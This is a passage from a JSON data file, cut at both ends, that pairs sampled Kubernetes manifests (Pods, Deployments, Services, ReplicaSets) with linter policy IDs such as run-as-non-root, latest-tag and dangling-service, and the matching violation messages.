failureThreshold: 5\n          successThreshold: 1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"connector\" has memory limit 0"
  },
  {
    "id": "8789",
    "manifest_path": "data/manifests/the_stack_sample/sample_3308.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: secret-using-volume\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    volumeMounts:\n    - name: secretvolume\n      mountPath: /etc/secrets\n      readOnly: true\n  volumes:\n  - name: secretvolume\n    secret:\n      secretName: myapi-url-token\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8790",
    "manifest_path": "data/manifests/the_stack_sample/sample_3308.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: secret-using-volume\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    volumeMounts:\n    - name: secretvolume\n      mountPath: /etc/secrets\n      readOnly: true\n  volumes:\n  - name: secretvolume\n    secret:\n      secretName: myapi-url-token\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "8791",
    "manifest_path": "data/manifests/the_stack_sample/sample_3308.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: secret-using-volume\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    volumeMounts:\n    - name: secretvolume\n      mountPath: /etc/secrets\n      readOnly: true\n  volumes:\n  - name: secretvolume\n    secret:\n      secretName: myapi-url-token\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "8792",
    "manifest_path": "data/manifests/the_stack_sample/sample_3308.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: secret-using-volume\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    volumeMounts:\n    - name: secretvolume\n      mountPath: /etc/secrets\n      readOnly: true\n  volumes:\n  - name: secretvolume\n    secret:\n      secretName: myapi-url-token\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "8793",
    "manifest_path": "data/manifests/the_stack_sample/sample_3308.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: secret-using-volume\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    volumeMounts:\n    - name: secretvolume\n      mountPath: /etc/secrets\n      readOnly: true\n  volumes:\n  - name: secretvolume\n    secret:\n      secretName: myapi-url-token\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "8794",
    "manifest_path": "data/manifests/the_stack_sample/sample_3310.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: nginx-service\n  namespace: default\nspec:\n  ports:\n  - port: 80\n    protocol: TCP\n  selector:\n    run: nginx-service\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[run:nginx-service])"
  },
  {
    "id": "8795",
    "manifest_path": "data/manifests/the_stack_sample/sample_3312.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20220517-17b68df070\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --continue-on-error=true\n        - --dry-run=false\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy.prow.svc.cluster.local\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        - --plugin-config=/etc/plugins/plugins.yaml\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: github-token\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-ci-robot-github-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"statusreconciler\" not found"
  },
  {
    "id": "8796",
    "manifest_path": "data/manifests/the_stack_sample/sample_3312.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20220517-17b68df070\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --continue-on-error=true\n        - --dry-run=false\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy.prow.svc.cluster.local\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        - --plugin-config=/etc/plugins/plugins.yaml\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: github-token\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-ci-robot-github-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"statusreconciler\" is not set to runAsNonRoot"
  },
  {
    "id": "8797",
    "manifest_path": "data/manifests/the_stack_sample/sample_3312.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20220517-17b68df070\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --continue-on-error=true\n        - --dry-run=false\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy.prow.svc.cluster.local\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        - --plugin-config=/etc/plugins/plugins.yaml\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: github-token\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-ci-robot-github-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"statusreconciler\" has cpu request 0"
  },
  {
    "id": "8798",
    "manifest_path": "data/manifests/the_stack_sample/sample_3312.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20220517-17b68df070\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --continue-on-error=true\n        - --dry-run=false\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy.prow.svc.cluster.local\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        - --plugin-config=/etc/plugins/plugins.yaml\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: github-token\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-ci-robot-github-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"statusreconciler\" has memory limit 0"
  },
  {
    "id": "8799",
    "manifest_path": "data/manifests/the_stack_sample/sample_3313.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: http-insecure-endpoint\n  labels:\n    app.kubernetes.io/name: http-insecure-endpoint\n    app.kubernetes.io/part-of: endpoints\nspec:\n  selector:\n    app.kubernetes.io/name: http-insecure-endpoint\n    app.kubernetes.io/part-of: endpoints\n  ports:\n  - name: endpoint\n    protocol: TCP\n    port: 8080\n    targetPort: endpoint\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/name:http-insecure-endpoint app.kubernetes.io/part-of:endpoints])"
  },
  {
    "id": "8800",
    "manifest_path": "data/manifests/the_stack_sample/sample_3315.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: mci-endpoint\nspec:\n  selector:\n    app: website\n  ports:\n  - name: http\n    nodePort: 32100\n    port: 80\n    protocol: TCP\n    targetPort: 80\n  type: NodePort\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:website])"
  },
  {
    "id": "8801",
    "manifest_path": "data/manifests/the_stack_sample/sample_3316.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: api-service-sandbox\n  name: api-service-sandbox\n  namespace: mi-production-tracker-sandbox\nspec:\n  ports:\n  - protocol: TCP\n    port: 8080\n    targetPort: 8080\n  selector:\n    app: api-service-sandbox\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:api-service-sandbox])"
  },
  {
    "id": "8802",
    "manifest_path": "data/manifests/the_stack_sample/sample_3317.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: redis\n  namespace: platform\nspec:\n  type: ClusterIP\n  ports:\n  - name: redis\n    port: 6379\n    targetPort: 6379\n  selector:\n    app: redis\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:redis])"
  },
  {
    "id": "8803",
    "manifest_path": "data/manifests/the_stack_sample/sample_3318.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-reaper\n  labels:\n    app: boskos-reaper\n  namespace: test-pods\nspec:\n  selector:\n    matchLabels:\n      app: boskos-reaper\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: boskos-reaper\n    spec:\n      containers:\n      - name: boskos-reaper\n        image: gcr.io/k8s-prow/boskos/reaper:v20200422-8c8546d74\n        args:\n        - --boskos-url=http://boskos.test-pods.svc.cluster.local.\n        - --resource-type=gce-project\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"boskos-reaper\" does not have a read-only root file system"
  },
  {
    "id": "8804",
    "manifest_path": "data/manifests/the_stack_sample/sample_3318.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-reaper\n  labels:\n    app: boskos-reaper\n  namespace: test-pods\nspec:\n  selector:\n    matchLabels:\n      app: boskos-reaper\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: boskos-reaper\n    spec:\n      containers:\n      - name: boskos-reaper\n        image: gcr.io/k8s-prow/boskos/reaper:v20200422-8c8546d74\n        args:\n        - --boskos-url=http://boskos.test-pods.svc.cluster.local.\n        - --resource-type=gce-project\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"boskos-reaper\" is not set to runAsNonRoot"
  },
  {
    "id": "8805",
    "manifest_path": "data/manifests/the_stack_sample/sample_3318.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-reaper\n  labels:\n    app: boskos-reaper\n  namespace: test-pods\nspec:\n  selector:\n    matchLabels:\n      app: boskos-reaper\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: boskos-reaper\n    spec:\n      containers:\n      - name: boskos-reaper\n        image: gcr.io/k8s-prow/boskos/reaper:v20200422-8c8546d74\n        args:\n        - --boskos-url=http://boskos.test-pods.svc.cluster.local.\n        - --resource-type=gce-project\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"boskos-reaper\" has cpu request 0"
  },
  {
    "id": "8806",
    "manifest_path": "data/manifests/the_stack_sample/sample_3318.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-reaper\n  labels:\n    app: boskos-reaper\n  namespace: test-pods\nspec:\n  selector:\n    matchLabels:\n      app: boskos-reaper\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: boskos-reaper\n    spec:\n      containers:\n      - name: boskos-reaper\n        image: gcr.io/k8s-prow/boskos/reaper:v20200422-8c8546d74\n        args:\n        - --boskos-url=http://boskos.test-pods.svc.cluster.local.\n        - --resource-type=gce-project\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"boskos-reaper\" has memory limit 0"
  },
  {
    "id": "8807",
    "manifest_path": "data/manifests/the_stack_sample/sample_3319.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kafka-client\n  namespace: default\nspec:\n  containers:\n  - name: kafka-client\n    image: confluentinc/cp-kafka:5.5.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kafka-client\" does not have a read-only root file system"
  },
  {
    "id": "8808",
    "manifest_path": "data/manifests/the_stack_sample/sample_3319.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kafka-client\n  namespace: default\nspec:\n  containers:\n  - name: kafka-client\n    image: confluentinc/cp-kafka:5.5.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kafka-client\" is not set to runAsNonRoot"
  },
  {
    "id": "8809",
    "manifest_path": "data/manifests/the_stack_sample/sample_3319.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kafka-client\n  namespace: default\nspec:\n  containers:\n  - name: kafka-client\n    image: confluentinc/cp-kafka:5.5.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"kafka-client\" has cpu request 0"
  },
  {
    "id": "8810",
    "manifest_path": "data/manifests/the_stack_sample/sample_3319.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kafka-client\n  namespace: default\nspec:\n  containers:\n  - name: kafka-client\n    image: confluentinc/cp-kafka:5.5.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kafka-client\" has memory limit 0"
  },
  {
    "id": "8811",
    "manifest_path": "data/manifests/the_stack_sample/sample_3321.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: carts-db\n  labels:\n    name: carts-db\n  namespace: sock-shop\nspec:\n  selector:\n    matchLabels:\n      name: carts-db\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        name: carts-db\n    spec:\n      containers:\n      - name: carts-db\n        image: mongo\n        ports:\n        - name: mongo\n          containerPort: 27017\n        securityContext:\n          capabilities:\n            drop:\n            - all\n            add:\n            - CHOWN\n            - SETGID\n            - SETUID\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - mountPath: /tmp\n          name: tmp-volume\n      volumes:\n      - name: tmp-volume\n        emptyDir:\n          medium: Memory\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"carts-db\" is using an invalid container image, \"mongo\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8812",
    "manifest_path": "data/manifests/the_stack_sample/sample_3321.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: carts-db\n  labels:\n    name: carts-db\n  namespace: sock-shop\nspec:\n  selector:\n    matchLabels:\n      name: carts-db\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        name: carts-db\n    spec:\n      containers:\n      - name: carts-db\n        image: mongo\n        ports:\n        - name: mongo\n          containerPort: 27017\n        securityContext:\n          capabilities:\n            drop:\n            - all\n            add:\n            - CHOWN\n            - SETGID\n            - SETUID\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - mountPath: /tmp\n          name: tmp-volume\n      volumes:\n      - name: tmp-volume\n        emptyDir:\n          medium: Memory\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"carts-db\" is not set to runAsNonRoot"
  },
  {
    "id": "8813",
    "manifest_path": "data/manifests/the_stack_sample/sample_3321.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: carts-db\n  labels:\n    name: carts-db\n  namespace: sock-shop\nspec:\n  selector:\n    matchLabels:\n      name: carts-db\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        name: carts-db\n    spec:\n      containers:\n      - name: carts-db\n        image: mongo\n        ports:\n        - name: mongo\n          containerPort: 27017\n        securityContext:\n          capabilities:\n            drop:\n            - all\n            add:\n            - CHOWN\n            - SETGID\n            - SETUID\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - mountPath: /tmp\n          name: tmp-volume\n      volumes:\n      - name: tmp-volume\n        emptyDir:\n          medium: Memory\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"carts-db\" has cpu request 0"
  },
  {
    "id": "8814",
    "manifest_path": "data/manifests/the_stack_sample/sample_3321.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: carts-db\n  labels:\n    name: carts-db\n  namespace: sock-shop\nspec:\n  selector:\n    matchLabels:\n      name: carts-db\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        name: carts-db\n    spec:\n      containers:\n      - name: carts-db\n        image: mongo\n        ports:\n        - name: mongo\n          containerPort: 27017\n        securityContext:\n          capabilities:\n            drop:\n            - all\n            add:\n            - CHOWN\n            - SETGID\n            - SETUID\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - mountPath: /tmp\n          name: tmp-volume\n      volumes:\n      - name: tmp-volume\n        emptyDir:\n          medium: Memory\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"carts-db\" has memory limit 0"
  },
  {
    "id": "8815",
    "manifest_path": "data/manifests/the_stack_sample/sample_3322.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: mysvc\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: mysvc\n    spec:\n      containers:\n      - name: mysvc\n        image: docker.io/olostan/test_svc:latest\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8010\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8010\n          initialDelaySeconds: 30\n          timeoutSeconds: 1\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"mysvc\" is using an invalid container image, \"docker.io/olostan/test_svc:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8816",
    "manifest_path": "data/manifests/the_stack_sample/sample_3322.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: mysvc\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: mysvc\n    spec:\n      containers:\n      - name: mysvc\n        image: docker.io/olostan/test_svc:latest\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8010\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8010\n          initialDelaySeconds: 30\n          timeoutSeconds: 1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mysvc\" does not have a read-only root file system"
  },
  {
    "id": "8817",
    "manifest_path": "data/manifests/the_stack_sample/sample_3322.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: mysvc\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: mysvc\n    spec:\n      containers:\n      - name: mysvc\n        image: docker.io/olostan/test_svc:latest\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8010\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8010\n          initialDelaySeconds: 30\n          timeoutSeconds: 1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mysvc\" is not set to runAsNonRoot"
  },
  {
    "id": "8818",
    "manifest_path": "data/manifests/the_stack_sample/sample_3322.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: mysvc\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: mysvc\n    spec:\n      containers:\n      - name: mysvc\n        image: docker.io/olostan/test_svc:latest\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8010\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8010\n          initialDelaySeconds: 30\n          timeoutSeconds: 1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mysvc\" has cpu request 0"
  },
  {
    "id": "8819",
    "manifest_path": "data/manifests/the_stack_sample/sample_3322.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: mysvc\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: mysvc\n    spec:\n      containers:\n      - name: mysvc\n        image: docker.io/olostan/test_svc:latest\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8010\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8010\n          initialDelaySeconds: 30\n          timeoutSeconds: 1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mysvc\" has memory limit 0"
  },
  {
    "id": "8820",
    "manifest_path": "data/manifests/the_stack_sample/sample_3323.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  annotations:\n    fabric8.io/expose: 'true'\n    fabric8.io/exposeUrl: https://docker.${NAMESPACE}.dev.nuxeo.com\n    fabric8.io/ingress.path: /(.*)\n    fabric8.io/ingress.tls-secret-name: ${NAMESPACE}-tls\n    fabric8.io/ingress.annotations: 'kubernetes.io/tls-acme: ''false''\n\n      kubernetes.io/ingress.class: nginx\n\n      nginx.ingress.kubernetes.io/proxy-body-size: 3g\n\n      nginx.ingress.kubernetes.io/rewrite-target: /repository/docker-registry/$1'\n  name: docker\n  namespace: ${NAMESPACE}\nspec:\n  type: ClusterIP\n  ports:\n  - name: docker\n    port: 80\n    protocol: TCP\n    targetPort: 8081\n  selector:\n    app: nexus\n    release: jenkins-x\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:nexus release:jenkins-x])"
  },
  {
    "id": "8821",
    "manifest_path": "data/manifests/the_stack_sample/sample_3325.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: consul-server-lb\nspec:\n  ports:\n  - protocol: TCP\n    port: 8501\n    targetPort: 8501\n  selector:\n    app: consul\n    component: server\n  type: LoadBalancer\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:consul component:server])"
  },
  {
    "id": "8822",
    "manifest_path": "data/manifests/the_stack_sample/sample_3329.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8710\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8823",
    "manifest_path": "data/manifests/the_stack_sample/sample_3329.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8710\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "8824",
    "manifest_path": "data/manifests/the_stack_sample/sample_3329.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8710\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "8825",
    "manifest_path": "data/manifests/the_stack_sample/sample_3329.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8710\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "8826",
    "manifest_path": "data/manifests/the_stack_sample/sample_3329.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8710\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "8827",
    "manifest_path": "data/manifests/the_stack_sample/sample_3332.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: skuleshov/micro_frontend:v0.0.2\n        env:\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: 127.0.0.1:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: 127.0.0.1:7000\n        - name: CART_SERVICE_ADDR\n          value: 127.0.0.1:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: 127.0.0.1:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: 127.0.0.1:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: 127.0.0.1:5050\n        - name: AD_SERVICE_ADDR\n          value: 127.0.0.1:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "8828",
    "manifest_path": "data/manifests/the_stack_sample/sample_3332.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: skuleshov/micro_frontend:v0.0.2\n        env:\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: 127.0.0.1:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: 127.0.0.1:7000\n        - name: CART_SERVICE_ADDR\n          value: 127.0.0.1:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: 127.0.0.1:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: 127.0.0.1:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: 127.0.0.1:5050\n        - name: AD_SERVICE_ADDR\n          value: 127.0.0.1:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "8829",
    "manifest_path": "data/manifests/the_stack_sample/sample_3332.yaml",
